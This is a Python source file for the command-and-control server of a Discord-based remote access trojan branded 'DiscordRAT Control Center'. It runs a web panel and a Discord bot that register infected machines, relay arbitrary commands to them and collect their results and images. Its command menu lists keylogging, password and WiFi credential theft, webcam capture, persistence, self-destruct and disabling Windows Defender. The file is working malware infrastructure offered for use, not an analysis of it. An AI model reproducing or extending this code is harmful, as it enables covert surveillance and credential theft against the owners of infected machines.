# server.py - Control Center (UPDATED with all commands)
import os
import sys
import json
import time
import threading
import asyncio
import base64
import socket
import platform
from datetime import datetime
from flask import Flask, request, jsonify, render_template, send_file
from flask_socketio import SocketIO, emit
from flask_cors import CORS
import discord
from discord.ext import commands
import psutil
import requests
from io import BytesIO

# ============================================
# CONFIGURATION
# ============================================
DISCORD_TOKEN = "tokenhere"
CLIENTS_FILE = "clients.json"
VERSION = "1.0.0"
CATEGORY_NAME = "RAT Clients"

app = Flask(__name__)
app.config['SECRET_KEY'] = 'your-secret-key-here'
CORS(app)
socketio = SocketIO(app, cors_allowed_origins="*", async_mode='threading')

# Global variables
clients = {}
bot = None
client_channels = {}
processed_messages = set()

class ControlBot(commands.Bot):
    def __init__(self):
        intents = discord.Intents.default()
        intents.message_content = True
        intents.members = True
        intents.guild_messages = True
        intents.guilds = True
        super().__init__(command_prefix="!", intents=intents)
        self.load_clients()

    def load_clients(self):
        global clients
        try:
            if os.path.exists(CLIENTS_FILE):
                with open(CLIENTS_FILE, 'r') as f:
                    clients = json.load(f)
                    print(f"📂 Loaded {len(clients)} clients from file")
            else:
                clients = {}
                print(f"📂 No clients file found, starting fresh")
        except Exception as e:
            print(f"Error loading clients: {e}")
            clients = {}

    def save_clients(self):
        try:
            with open(CLIENTS_FILE, 'w') as f:
                json.dump(clients, f, indent=2)
            print(f"💾 Saved {len(clients)} clients")
        except Exception as e:
            print(f"Error saving clients: {e}")

    async def on_ready(self):
        print(f"✅ Bot connected as {self.user}")
        print(f"📡 Bot ID: {self.user.id}")
        print(f"📁 Looking for '{CATEGORY_NAME}' category...")
        
        category = None
        for guild in self.guilds:
            for cat in guild.categories:
                if cat.name == CATEGORY_NAME:
                    category = cat
                    break
            if category:
                break
        
        if category:
            print(f"✅ Found category: {category.name}")
            for channel in category.text_channels:
                print(f"   📡 Monitoring: #{channel.name}")
                client_id = channel.name.replace('-', '_')
                if client_id not in clients:
                    clients[client_id] = {
                        'client_id': client_id,
                        'hostname': client_id.split('_')[0] if '_' in client_id else client_id,
                        'ip': 'Unknown',
                        'os': 'Unknown',
                        'username': 'Unknown',
                        'status': 'online',
                        'last_heartbeat': time.time(),
                        'connected_at': datetime.now().isoformat(),
                        'last_command': None,
                        'command_history': [],
                        'images': []
                    }
                    print(f"   ✅ Added client: {client_id}")
                client_channels[client_id] = channel
        else:
            print(f"❌ Category '{CATEGORY_NAME}' not found!")
        
        self.save_clients()
        socketio.emit('server_ready', {'status': 'ready', 'clients': clients})
        self.loop.create_task(self.monitor_clients())

    async def monitor_clients(self):
        while True:
            await asyncio.sleep(30)
            current_time = time.time()
            updated = False
            for client_id, data in list(clients.items()):
                if current_time - data.get('last_heartbeat', 0) > 120:
                    if data.get('status') != 'offline':
                        data['status'] = 'offline'
                        updated = True
                        socketio.emit('client_update', {'client_id': client_id, 'status': 'offline'})
            if updated:
                self.save_clients()

    async def on_message(self, message):
        if not message.channel.category or message.channel.category.name != CATEGORY_NAME:
            return
        
        if message.id in processed_messages:
            return
        processed_messages.add(message.id)

        print(f"\n📨 MESSAGE from #{message.channel.name}")
        print(f"   Author: {message.author.name}")
        print(f"   Content: {message.content[:50] if message.content else '[FILE/EMBED]'}")
        print(f"   Attachments: {len(message.attachments)}")
        
        client_id = message.channel.name.replace('-', '_')
        client_channels[client_id] = message.channel
        
        if client_id not in clients:
            clients[client_id] = {
                'client_id': client_id,
                'hostname': client_id.split('_')[0] if '_' in client_id else client_id,
                'ip': 'Unknown',
                'os': 'Unknown',
                'username': 'Unknown',
                'status': 'online',
                'last_heartbeat': time.time(),
                'connected_at': datetime.now().isoformat(),
                'last_command': None,
                'command_history': [],
                'images': []
            }
            self.save_clients()
            socketio.emit('client_connected', clients[client_id])
            socketio.emit('clients_update', {'clients': clients})
            print(f"   ✅ Registered new client: {client_id}")
        
        if message.content and message.content.startswith("HEARTBEAT:"):
            clients[client_id]['status'] = 'online'
            clients[client_id]['last_heartbeat'] = time.time()
            self.save_clients()
            socketio.emit('client_update', {'client_id': client_id, 'status': 'online'})
            return
        
        # Handle image attachments
        if message.attachments:
            for attachment in message.attachments:
                if attachment.filename.lower().endswith(('.jpg', '.jpeg', '.png', '.gif', '.webp')):
                    print(f"   📸 IMAGE DETECTED: {attachment.filename}")
                    if 'images' not in clients[client_id]:
                        clients[client_id]['images'] = []
                    image_data = {
                        'url': attachment.url,
                        'filename': attachment.filename,
                        'timestamp': datetime.now().isoformat()
                    }
                    clients[client_id]['images'].append(image_data)
                    if len(clients[client_id]['images']) > 50:
                        clients[client_id]['images'] = clients[client_id]['images'][-50:]
                    self.save_clients()
                    socketio.emit('image_update', {
                        'client_id': client_id,
                        'image': image_data
                    })
                    print(f"   ✅ Image broadcast to web: {attachment.filename}")
        
        # Handle command results
        if message.content and message.content.startswith("RESULT:"):
            try:
                _, cid, result = message.content.split(":", 2)
                if cid in clients:
                    if 'command_history' not in clients[cid]:
                        clients[cid]['command_history'] = []
                    clients[cid]['command_history'].append({
                        'command': clients[cid].get('last_command', 'unknown'),
                        'result': result[:500] + '...' if len(result) > 500 else result,
                        'timestamp': datetime.now().isoformat()
                    })
                    self.save_clients()
                    socketio.emit('command_result', {
                        'client_id': cid,
                        'result': result,
                        'timestamp': datetime.now().isoformat()
                    })
                    print(f"📤 Result from {cid}: {result[:50]}...")
            except Exception as e:
                print(f"Error handling result: {e}")
            return
        
        # Handle errors
        if message.content and message.content.startswith("ERROR:"):
            try:
                _, cid, error = message.content.split(":", 2)
                socketio.emit('command_error', {
                    'client_id': cid,
                    'error': error,
                    'timestamp': datetime.now().isoformat()
                })
                print(f"❌ Error from {cid}: {error}")
            except:
                pass
            return

    async def send_command(self, client_id, command):
        channel = client_channels.get(client_id)
        if not channel:
            for guild in self.guilds:
                for cat in guild.categories:
                    if cat.name == CATEGORY_NAME:
                        for ch in cat.text_channels:
                            if ch.name.replace('-', '_') == client_id:
                                channel = ch
                                client_channels[client_id] = ch
                                break
                    if channel:
                        break
                if channel:
                    break
        
        if not channel:
            print(f"❌ Channel not found for {client_id}")
            return False
        
        try:
            await channel.send(f"CMD:{client_id}:{command}")
            if client_id in clients:
                clients[client_id]['last_command'] = command
                self.save_clients()
            print(f"📤 Sent command to {client_id}: {command}")
            return True
        except Exception as e:
            print(f"Error sending command: {e}")
            return False

# Flask routes
@app.route('/')
def index():
    return render_template('index.html')

@app.route('/api/clients')
def get_clients():
    return jsonify(clients)

@app.route('/api/client/<client_id>')
def get_client(client_id):
    if client_id in clients:
        return jsonify(clients[client_id])
    return jsonify({'error': 'Client not found'}), 404

@app.route('/api/client/<client_id>/images')
def get_client_images(client_id):
    if client_id in clients:
        return jsonify({'images': clients[client_id].get('images', [])})
    return jsonify({'error': 'Client not found'}), 404

@app.route('/api/client/<client_id>/clear_images', methods=['POST'])
def clear_client_images(client_id):
    if client_id in clients:
        clients[client_id]['images'] = []
        bot.save_clients()
        socketio.emit('images_cleared', {'client_id': client_id})
        return jsonify({'success': True})
    return jsonify({'error': 'Client not found'}), 404

@app.route('/api/command', methods=['POST'])
def send_command():
    data = request.json
    client_id = data.get('client_id')
    command = data.get('command')
    
    if not client_id or not command:
        return jsonify({'error': 'Missing client_id or command'}), 400
    
    if bot:
        future = asyncio.run_coroutine_threadsafe(
            bot.send_command(client_id, command),
            bot.loop
        )
        try:
            result = future.result(timeout=5)
            return jsonify({'status': 'sent', 'success': result})
        except Exception as e:
            return jsonify({'error': str(e)}), 500
    
    return jsonify({'error': 'Bot not ready'}), 500

@app.route('/api/quick_commands')
def get_quick_commands():
    commands = [
        {'name': 'System Info', 'command': 'info'},
        {'name': 'List Files', 'command': 'ls'},
        {'name': 'Screenshot', 'command': 'screenshot'},
        {'name': 'Webcam', 'command': 'webcam'},
        {'name': 'Keylogs', 'command': 'keylogs'},
        {'name': 'Passwords', 'command': 'passwords'},
        {'name': 'WiFi', 'command': 'wifi'},
        {'name': 'Ping', 'command': 'ping'},
        {'name': 'Uptime', 'command': 'uptime'},
        {'name': 'Persist', 'command': 'persist'},
        {'name': 'Self Destruct', 'command': 'selfdestruct'},
        {'name': 'RDP', 'command': 'rdp'},
        {'name': 'Lock', 'command': 'lock'},
        {'name': 'Restart', 'command': 'restart'},
        {'name': 'Shutdown', 'command': 'shutdown'},
        {'name': 'Logout', 'command': 'logout'},
        {'name': 'Sleep', 'command': 'sleep'},
        {'name': 'Hibernate', 'command': 'hibernate'},
        {'name': 'Clear Images', 'command': 'clearimages'},
        {'name': 'Help', 'command': 'help'},
        {'name': 'Beep', 'command': 'beep'},
        {'name': 'Speak', 'command': 'speak'},
        {'name': 'Open URL', 'command': 'openurl'},
        {'name': 'Volume', 'command': 'volume'},
        {'name': 'Wallpaper', 'command': 'wallpaper'},
        {'name': 'Screen Brightness', 'command': 'screenbrightness'},
        {'name': 'Netstat', 'command': 'netstat'},
        {'name': 'ARP', 'command': 'arp'},
        {'name': 'NSLookup', 'command': 'nslookup'},
        {'name': 'Ping Host', 'command': 'pinghost'},
        {'name': 'Disable Defender', 'command': 'disabledefender'},
        {'name': 'Enable Defender', 'command': 'enabledefender'},
        {'name': 'Add Defender Exclusion', 'command': 'adddefenderexclusion'},
        {'name': 'Whoami', 'command': 'shell whoami'},
        {'name': 'IP Config', 'command': 'shell ipconfig'},
        {'name': 'History', 'command': 'history'},
    ]
    return jsonify(commands)

# SocketIO events
@socketio.on('connect')
def handle_connect():
    print('🌐 Web client connected')
    emit('connected', {'status': 'connected', 'clients': clients})
    emit('clients_update', {'clients': clients})

@socketio.on('disconnect')
def handle_disconnect():
    print('🌐 Web client disconnected')

@socketio.on('get_clients')
def handle_get_clients():
    emit('clients_update', {'clients': clients})

# Initialize bot
def run_bot():
    global bot
    bot = ControlBot()
    try:
        bot.run(DISCORD_TOKEN)
    except discord.LoginFailure:
        print("❌ Invalid Discord token!")
        sys.exit(1)
    except Exception as e:
        print(f"Bot error: {e}")

# Main
if __name__ == '__main__':
    print("""
╔═══════════════════════════════════════════════════════════╗
║                                                           ║
║   🚀 DiscordRAT Control Center v4.0                     ║
║                                                           ║
║   🌐 Web Interface: http://localhost:5000                ║
║   📡 47+ Commands Available                             ║
║   🎮 Fun Commands: beep, speak, volume, openurl         ║
║   🛡️ Defender Commands                                 ║
║   💀 Self Destruct                                      ║
║                                                           ║
╚═══════════════════════════════════════════════════════════╝
""")
    
    bot_thread = threading.Thread(target=run_bot, daemon=True)
    bot_thread.start()
    
    print(f"\n🌐 Server starting on http://localhost:5000")
    socketio.run(app, host='0.0.0.0', port=5000, debug=True, use_reloader=False)